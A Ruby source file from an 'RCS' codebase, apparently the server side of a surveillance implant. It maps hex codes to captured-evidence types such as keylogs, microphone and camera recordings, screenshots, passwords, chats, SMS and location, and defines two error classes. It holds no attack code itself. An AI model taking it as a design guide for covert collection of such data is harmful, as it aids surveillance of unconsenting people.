
require 'rcs-common'

module RCS

EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                   0x0140 => :CALL,
                   0x0230 => :CALLLIST,
                   0xC2C2 => :MIC,
                   0x0241 => :INFO,
                   0xB9B9 => :SCREENSHOT,
                   0x0040 => :KEYLOG,
                   0xE9E9 => :CAMERA,
                   0xC6C6 => :CHAT,
                   0x0300 => :CHATSKYPE,
                   0x0301 => :SOCIAL,      #formato identico a chat
                   0x0280 => :MOUSE,
                   0x0100 => :PRINT,
                   0x0180 => :URL,
                   0x0181 => :URLCAPTURE,  #missing
                   0xD9D9 => :CLIPBOARD,
                   0xFAFA => :PASSWORD,
                   0x0000 => :FILEOPEN,    #file
                   0x0001 => :FILECAP,     #file
                   0x1011 => :APPLICATION,
                   0xD0D0 => :DOWNLOAD,    #file
                   0x1220 => :POSITION,
                   0xEDA1 => :FILESYSTEM,  
                   0x1001 => :MAILRAW,
                   0x0210 => :MAIL,        #missing  #message
                   0x0211 => :SMS,
                   0x0213 => :SMSNEW,
                   0x0212 => :MMS,         #missing  #message
                   0x0200 => :ADDRESSBOOK,
                   0x0250 => :IADDRESSBOOK,
                   0x0201 => :CALENDAR,
                   0x0202 => :TASK}        #missing

class EvidenceDeserializeError < StandardError
  attr_reader :msg
  
  def initialize(msg)
    @msg = msg
  end
  
  def to_s
    @msg
  end
end

class EmptyEvidenceError < StandardError
  attr_reader :msg

  def initialize(msg)
    @msg = msg
  end

  def to_s
    @msg
  end
end

end # RCS::

class Integer
  def rand_times(&block)
    (rand(self-1)+1).times { yield }
  end
end
